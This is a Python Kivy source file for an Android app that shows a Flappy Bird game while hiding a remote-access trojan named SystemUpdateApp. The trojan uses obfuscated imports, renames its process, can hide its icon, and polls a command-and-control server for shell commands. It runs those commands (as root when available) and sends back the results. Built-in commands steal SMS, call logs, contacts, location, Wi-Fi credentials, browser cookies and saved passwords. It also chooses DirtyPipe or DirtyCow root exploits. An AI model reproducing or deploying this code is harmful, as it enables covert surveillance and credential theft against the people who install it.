import threading
import base64
import time
import json
import random
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.widget import Widget
from kivy.properties import NumericProperty
from kivy.clock import Clock
from kivy.graphics import Color, Ellipse, Rectangle

class FlappyBirdGame(Widget):
    bird_y = NumericProperty(0)
    bird_v = NumericProperty(0)
    score = NumericProperty(0)
    
    def __init__(self, **kwargs):
        super(FlappyBirdGame, self).__init__(**kwargs)
        self.bird_y = 500
        self.pipes = []
        self.game_over = False
        self.game_started = False
        
        self.bind(bird_y=self._update_bird_gfx)
        
        with self.canvas:
            Color(0.2, 0.6, 0.8) # Sky blue background
            self.bg = Rectangle(pos=self.pos, size=(2000, 4000))
            Color(1, 1, 0) # Yellow bird
            self.bird_gfx = Ellipse(pos=(100, self.bird_y), size=(50, 50))
            
        self.label = Label(text='TAP TO START', font_size=70, pos=(0, 200))
        self.add_widget(self.label)
            
        self.bind(size=self._update_bg)
        Clock.schedule_interval(self.update, 1.0/60.0)
        Clock.schedule_interval(self.spawn_pipe, 2.0)

    def _update_bg(self, *args):
        self.bg.size = self.size
        self.bg.pos = self.pos
        self.label.center_x = self.center_x
        self.label.center_y = self.center_y + 200

    def _update_bird_gfx(self, *args):
        self.bird_gfx.pos = (100, self.bird_y)

    def spawn_pipe(self, dt):
        if self.game_over or not self.game_started: return
        gap_y = random.randint(300, max(400, int(self.height - 300)))
        gap_size = 450
        with self.canvas.before:
            Color(0, 0.7, 0) # Green pipes
            p_top = Rectangle(pos=(self.width, gap_y + gap_size/2), size=(120, self.height))
            p_bot = Rectangle(pos=(self.width, 0), size=(120, gap_y - gap_size/2))
        self.pipes.append({'top': p_top, 'bot': p_bot, 'scored': False})

    def update(self, dt):
        if not self.game_started or self.game_over: return
        
        self.bird_v -= 0.8
        self.bird_y += self.bird_v

        for p in self.pipes[:]:
            p['top'].pos = (p['top'].pos[0] - 8, p['top'].pos[1])
            p['bot'].pos = (p['bot'].pos[0] - 8, p['bot'].pos[1])
            
            bx, by = 100, self.bird_y
            bw, bh = 50, 50
            px = p['top'].pos[0]
            pw = 120
            
            if bx + bw > px and bx < px + pw:
                if by + bh > p['top'].pos[1] or by < p['bot'].pos[1] + p['bot'].size[1]:
                    self.end_game()
            
            if not p['scored'] and px + pw < bx:
                self.score += 1
                p['scored'] = True
                self.label.text = f'Score: {self.score}'
            
            if p['top'].pos[0] < -150:
                self.canvas.before.remove(p['top'])
                self.canvas.before.remove(p['bot'])
                self.pipes.remove(p)

        if self.bird_y < 0 or self.bird_y > self.height:
            self.end_game()

    def end_game(self):
        self.game_over = True
        self.label.text = f'GAME OVER\nScore: {self.score}\nTap to restart'
        Clock.schedule_once(self.reset_game, 2.0)

    def reset_game(self, dt=0):
        self.bird_y = self.height / 2 if self.height > 0 else 500
        self.bird_v = 0
        self.score = 0
        for p in self.pipes:
            try:
                self.canvas.before.remove(p['top'])
                self.canvas.before.remove(p['bot'])
            except: pass
        self.pipes = []
        self.game_over = False
        self.game_started = False
        self.label.text = 'TAP TO START'

    def on_touch_down(self, touch):
        if self.game_over: return True
        if not self.game_started:
            self.game_started = True
            self.label.text = 'Score: 0'
        self.bird_v = 15
        return True

class SystemUpdateApp(App):
    def build(self):
        # Configuration - replaced by BuildozerPayloadGenerator
        self.C2_URL = "{{STAGE2URL}}"
        self.LHOST = "{{LHOST}}"
        self.LPORT = "{{LPORT}}"
        self.XOR_KEY = "{{XOR_KEY}}"
        self.SHOW_UI = "{{SHOW_UI}}"
        self.HIDE_ICON = "{{HIDE_ICON}}"
        self.RESULT_SINK = "{{RESULT_SINK}}"
        self.EXTERNAL_TASK_URL = "{{EXTERNAL_TASK_URL}}"
        self.WAKELOCK = "{{WAKELOCK}}"
        self.MIN_SLEEP = "{{MIN_SLEEP}}"
        self.MAX_SLEEP = "{{MAX_SLEEP}}"
        
        # Fallbacks
        if "{{" + "LHOST" + "}}" == self.LHOST: self.LHOST = "127.0.0.1"
        if "{{" + "LPORT" + "}}" == self.LPORT: self.LPORT = "5000"
        if "{{" + "STAGE2URL" + "}}" == self.C2_URL: self.C2_URL = f"https://{self.LHOST}:{self.LPORT}"
        if "{{" + "XOR_KEY" + "}}" == self.XOR_KEY: self.XOR_KEY = "SuperSploitKey"
        if "{{" + "SHOW_UI" + "}}" == self.SHOW_UI: self.SHOW_UI = "true"
        if "{{" + "HIDE_ICON" + "}}" == self.HIDE_ICON: self.HIDE_ICON = "false"
        if "{{" + "RESULT_SINK" + "}}" == self.RESULT_SINK: self.RESULT_SINK = ""
        if "{{" + "EXTERNAL_TASK_URL" + "}}" == self.EXTERNAL_TASK_URL: self.EXTERNAL_TASK_URL = ""
        if "{{" + "WAKELOCK" + "}}" == self.WAKELOCK: self.WAKELOCK = "false"
        if "{{" + "MIN_SLEEP" + "}}" == self.MIN_SLEEP: self.MIN_SLEEP = "60"
        if "{{" + "MAX_SLEEP" + "}}" == self.MAX_SLEEP: self.MAX_SLEEP = "300"

        # Internal State
        self.completed_tasks_file = "tasks.json"
        self.completed_tasks = self._load_completed_tasks()
        self.is_root = False

        # Dynamic Imports Helper
        def _i(b, f=None):
            m = base64.b64decode(b).decode('utf-8')
            return __import__(m, fromlist=[f] if f else [])

        # Obfuscated dynamic imports
        self._o = _i(b'b3M=') # os
        self._s = _i(b'c3VicHJvY2Vzcw==') # subprocess
        self._sh = _i(b'c2hsZXg=') # shlex
        self._io = _i(b'aW8=') # io
        self._sy = _i(b'c3lz') # sys
        self._tm = _i(b'dGltZQ==') # time
        self._rd = _i(b'cmFuZG9t') # random
        self._ur = _i(b'dXJsbGliLnJlcXVlc3Q=', 'Request') # urllib.request
        self._sl = _i(b'c3Ns')    # ssl
        self._ct = _i(b'Y3R5cGVz') # ctypes

        # Thread Renaming (Stealth)
        try:
            libc = self._ct.CDLL('libc.so')
            libc.prctl(15, b'sys_watchdog', 0, 0, 0)
        except: pass

        if self.HIDE_ICON.lower() in ["true", "1", "yes", "y"]:
            Clock.schedule_once(self.hide_launcher_icon, 15)

        threading.Thread(target=self.phantom_loop, daemon=True).start()
        
        if self.SHOW_UI.lower() in ["false", "0", "no", "n"]:
            return Widget()
        return FlappyBirdGame()

    def hide_launcher_icon(self, dt):
        try:
            from jnius import autoclass
            cls = autoclass('org.kivy.android.PythonActivity')
            act = cls.mActivity
            comp = autoclass('android.content.ComponentName')(act.getPackageName(), act.getClass().getName())
            act.getPackageManager().setComponentEnabledSetting(comp, autoclass('android.content.pm.PackageManager').COMPONENT_ENABLED_STATE_DISABLED, autoclass('android.content.pm.PackageManager').DONT_KILL_APP)
        except: pass

    def check_su(self):
        if self._o.getuid() == 0: return True
        try:
            proc = self._s.run(['su', '-c', 'id'], capture_output=True, text=True, timeout=5)
            if 'uid=0' in proc.stdout: return True
        except: pass
        return False

    def _load_completed_tasks(self):
        try:
            with open(self.completed_tasks_file, 'r') as f:
                return json.load(f)
        except: return []

    def _xor(self, data, key):
        if isinstance(data, str): data = data.encode('utf-8', errors='ignore')
        return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])

    def _report_result(self, data):
        try:
            url = self.RESULT_SINK if self.RESULT_SINK else f"{self.C2_URL}/rfile"
            if self.RESULT_SINK:
                payload = json.dumps({"content": f"```\n[Phantom Beacon Callback]\n{data}\n```"}).encode()
                req = getattr(self._ur, 'Request')(url, data=payload, method='POST', headers={'Content-Type': 'application/json'})
            else:
                enc = base64.b64encode(self._xor(data, self.XOR_KEY))
                req = getattr(self._ur, 'Request')(url, data=enc, method='POST')
            
            ctx = self._sl.SSLContext(self._sl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = self._sl.CERT_NONE
            with getattr(self._ur, 'urlopen')(req, timeout=15, context=ctx) as r: pass
        except Exception: pass

    def _fetch_task(self):
        try:
            url = self.EXTERNAL_TASK_URL if self.EXTERNAL_TASK_URL else f"{self.C2_URL}/file"
            req = getattr(self._ur, 'Request')(url)
            ctx = self._sl.SSLContext(self._sl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = self._sl.CERT_NONE
            with getattr(self._ur, 'urlopen')(req, timeout=15, context=ctx) as r:
                blob = r.read().strip()
            if not blob: return None
            dec = base64.b64decode(blob)
            return self._xor(dec, self.XOR_KEY).decode('utf-8', errors='ignore').strip()
        except Exception: return None

    def phantom_loop(self):
        while True:
            try:
                self.is_root = self.check_su()
                if self.is_root and self.WAKELOCK.lower() in ["true", "1", "yes", "y"]:
                    try:
                        with open('/sys/power/wake_lock', 'w') as f: f.write('sys_watchdog')
                    except: pass

                try: sleep_duration = getattr(self._rd, 'randint')(int(self.MIN_SLEEP), int(self.MAX_SLEEP))
                except: sleep_duration = getattr(self._rd, 'randint')(60, 300)
                getattr(self._tm, 'sleep')(sleep_duration)
                
                cmd = self._fetch_task()
                if not cmd: continue
                if cmd.lower() == 'exit': break
                
                output = self._execute_command(cmd)
                self._report_result(f"Command: {cmd}\nOutput:\n{output}")
            except Exception: pass

    def _execute_command(self, cmd):
        if cmd == 'auto_root':
            if self.is_root: return "[+] Already Root.\n"
            try:
                release = self._o.uname().release
                if release.startswith('5.'):
                    minor = int(release.split('.')[1])
                    if 8 <= minor <= 16: return "GET_EXPLOIT exploits/android/cve_2022_0847_dirtypipe.py\n"
                if any(v in release for v in ["3.10", "3.4", "3.18"]) or release.startswith('4.'):
                    return "GET_EXPLOIT exploits/android/cve_2016_5195_dirtycow.py\n"
                return f"[-] No exploit for {release}\n"
            except Exception as e: return f"Error: {e}"

        env = getattr(self._o, 'environ').copy()
        if 'LD_LIBRARY_PATH' in env: del env['LD_LIBRARY_PATH']
        
        # Elevated execution logic
        target_cmd = cmd
        if cmd == 'dump_sms': target_cmd = "content query --uri content://sms"
        elif cmd == 'dump_calls': target_cmd = "content query --uri content://call_log/calls"
        elif cmd == 'dump_contacts': target_cmd = "content query --uri content://contacts/phones"
        elif cmd == 'dump_calendar': target_cmd = "content query --uri content://com.android.calendar/events"
        elif cmd == 'get_accounts': target_cmd = "dumpsys account"
        elif cmd == 'list_apps': target_cmd = "pm list packages -f"
        elif cmd == 'get_location': target_cmd = "dumpsys location | grep -E \"last location|Last Known Locations:\" -A 10"
        elif cmd == 'dump_wifi': target_cmd = "cat /data/misc/wifi/WifiConfigStore.xml /data/misc/wifi/wpa_supplicant.conf /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null"
        elif cmd == 'dump_chrome': target_cmd = "cat \"/data/data/com.android.chrome/app_chrome/Default/Cookies\" \"/data/data/com.android.chrome/app_chrome/Default/Login Data\" 2>/dev/null"
        elif cmd == 'dump_google_passwords': target_cmd = "cat /data/data/com.google.android.gms/databases/autofill.db /data/data/com.google.android.gms/databases/credential_manager.db /data/data/com.google.android.gms/databases/password_store.db /data/system_ce/0/accounts_ce.db 2>/dev/null"
        elif cmd == 'find_cookies': target_cmd = "find /data/data/ -name \"Cookies\" -o -name \"*cookies.db*\" 2>/dev/null"
        elif cmd == 'find_passwords': target_cmd = "find /data/data/ -name \"Login Data\" -o -name \"*password*\" -o -name \"*credential*\" 2>/dev/null"

        if self.is_root and self._o.getuid() != 0 and not target_cmd.startswith("su -c"):
            final_cmd = f"su -c '{target_cmd}'"
        else: final_cmd = target_cmd

        try:
            proc = getattr(self._s, 'run')(final_cmd, shell=True, capture_output=True, text=True, timeout=30, env=env)
            return (proc.stdout + proc.stderr) or " \n"
        except Exception as e: return f"Error: {e}"

if __name__ == '__main__':
    SystemUpdateApp().run()
